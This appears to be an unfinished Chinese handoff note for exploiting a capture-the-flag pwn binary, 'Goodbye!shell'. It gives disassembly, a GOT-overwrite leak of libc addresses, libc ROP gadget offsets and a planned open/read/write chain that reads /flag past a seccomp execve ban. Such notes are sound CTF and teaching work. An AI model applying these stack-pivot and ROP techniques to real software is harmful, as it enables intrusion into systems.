# 2-1 Goodbye!shell — 利用设计（未完成，交接用）

## 二进制

```
vuln @ 0x40121f:
  push rbp; mov rbp,rsp; sub rsp,0x20
  lea rax,[rbp-0x20]
  mov edx,0x30; mov rsi,rax; mov edi,0
  call read@plt              ; 0x30 读入 0x20 缓冲区 → 0x10 溢出
  write(1, "Goodbye!shell.\n", 9)
  leave; ret
```

- 无 PIE、无 canary、NX 开启
- seccomp：默认 ALLOW，禁 `execve(59)` / `execveat(322)`
- 二进制内**没有** pop rdi/rsi/rdx/syscall gadget，只有：
  - `pop rbp; ret` @ 0x40119d
  - `leave; ret` @ 0x40121d / 0x40125b
  - read 调用点 @ 0x40122b，write 调用点 @ 0x401241

GOT：`seccomp_init 0x404018`、`rule_add 0x404020`、`write 0x404028`、`seccomp_load 0x404030`、`read 0x404038`

## 已验证的原语（leak2.py 可复现）

1. 第一次溢出：`saved rbp=0x404058`、`saved rip=0x40122b`
   （vuln 的 leave 用**原始 rbp** 弹栈，所以 saved rbp/rip 生效）
2. 第二次读落在 `0x404038`（read@got），0x30 字节里把 `read@got` 改成 `write@plt`，并把 `[0x404058]=rbp_next`、`[0x404060]=rip_next`
3. 跳到 `0x40122b` 且 `rbp=0x404038` 时：`write(0, 0x404018, 0x30)` → **泄漏 5 个 GOT**
4. 实测泄漏（两次连接）：

```
0x7f2e87d583e0  0x7f2e87d59800  0x7f2e87c369c0  0x7f2e87d58c50  0x4010a0
libc base = 0x7f2e87b22000   （write offset 0x1149c0）
```

ASLR 每次连接不同（0x7f2e... vs 0x7ff3...），必须单连接内完成。

## 第三段（关键）

泄漏后 `[0x404040]` 可设成 `0x40121f`（vuln），形成第三次读：

- vuln 入口 rsp = 0x404048 → rbp = 0x404040 → read 目标 `0x404020`，覆盖 `0x404020..0x404050`
- 该缓冲区可同时设置：`write@got`（必须恢复成 libc write）、`read@got`（设为 libc gadget）、`[0x404040]`/`[0x404048]`（下一跳 rbp/rip）

## libc gadget 偏移（libc.so.6 已验证）

| gadget | offset |
|---|---|
| pop rdi; ret | 0x2a3e5 |
| pop rsi; ret | 0x2be51 |
| pop rdx; ret | 0x47ce |
| pop rax; ret | 0x45eb0 |
| syscall; ret | 0x912d6 |
| leave; ret | 0x4da83 |
| open | 0x114630 |
| read | 0x114920 |
| write | 0x1149c0 |

## 未解决的一步

第三段读之后，若设 `rbp_next = 0x404030`，则：

```
leave: pop rbp=[0x404030]=seccomp_load(libc); ret=[0x404038]=pop_rdi
pop rdi ← [0x404040]（可控）
ret  ← [0x404048]（可控）
rsp = 0x404050  ← 缓冲区外，但属于第二段缓冲区（泄漏前写入，只能是二进制地址）
```

即链的第 4 个 qword 落在 `0x404050`，只能放二进制地址（如 `0x40122b`/`0x40121f`），无法直接接 libc 链。

**下一步思路**：在第二段缓冲区里预先在 `0x404050` 放 `0x40121f`（vuln），让链再绕一轮 `vuln`，把 `0x404050+` 用第三/四次读补齐，再接完整 ORW：

```
pop rdi; "/flag\0"
pop rsi; 0
open
pop rdi; 3
pop rsi; 0x404700
pop rdx; 0x100
read
pop rdi; 1
pop rsi; 0x404700
pop rdx; 0x100
write
```

## 复现脚本

- `work/2-1/leak2.py` — 泄漏（可用）
- `work/2-1/gadget_libc2.py` — gadget 偏移
- `work/2-1/rdx_scan.py` — pop rdx 扫描
